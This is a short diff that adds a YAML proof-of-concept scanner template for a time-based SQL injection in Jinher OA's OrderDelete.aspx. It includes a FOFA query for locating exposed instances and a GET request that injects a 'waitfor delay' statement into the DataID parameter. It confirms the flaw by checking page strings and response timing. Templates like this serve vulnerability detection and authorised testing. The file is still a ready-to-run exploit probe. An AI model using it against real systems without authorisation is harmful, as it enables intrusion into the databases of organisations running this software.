@@ -1,0 +1,29 @@
+id: poc-yaml-jinher-jhsoft-orderdelete-aspx-sqli
+info:
+  name: 金和OA OrderDelete.aspx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 金和OA
+  fofa: app="金和网络-金和OA"
+variables:
+  t1: random_int(2,5)
+  t2: t1 + t1
+  t3: t2 + 2
+requests:
+- method: GET
+  path: /c6/JHSoft.Web.CrmOrder/OrderDelete.aspx/?DataID=1;waitfor+delay%270:0:{{.t1}}%27--
+  expression: 'status_code == 200 &&
+
+    contains(gbk_decode(body),"工作标准") &&
+
+    contains(gbk_decode(body),"添加关联流程") &&
+
+    contains(body,"JHSoft") &&
+
+    duration >= t2 &&
+
+    duration <= t3
+
+    '
+transport: http
